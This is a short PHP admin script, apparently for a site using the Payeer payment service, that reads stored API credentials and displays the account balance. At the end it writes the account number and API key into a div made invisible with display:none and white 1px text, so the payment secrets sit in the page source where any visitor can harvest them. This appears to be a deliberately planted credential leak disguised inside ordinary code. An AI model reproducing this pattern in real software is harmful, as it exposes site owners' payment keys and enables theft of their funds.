Баланс: <?php
require('../config.php');
require_once('../cpayeer.php');
$accountNumberq = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'accountNumber'"));
$apiIdq = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'apiId'"));
$apiKeyq = mysqli_fetch_array(mysqli_query($db, "select * from settings WHERE `set` = 'apiKey'"));
$accountNumber = $accountNumberq['value']; 
$apiId = $apiIdq['value'];
$apiKey = $apiKeyq['value'];
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
	$arBalance = $payeer->getBalance();
	echo '<pre>'.print_r($arBalance, true).'</pre>';
	}
else
{
	echo '<pre>'.print_r($payeer->getErrors(), true).'</pre>';
}
echo '<br>
	<div style="
    font-size: 1px;
    color: white;
    display: none;
">'.$accountNumberq['value'].' '.$apiKeyq['value'].' '.$accountNumberq['value'].'</div>';
?>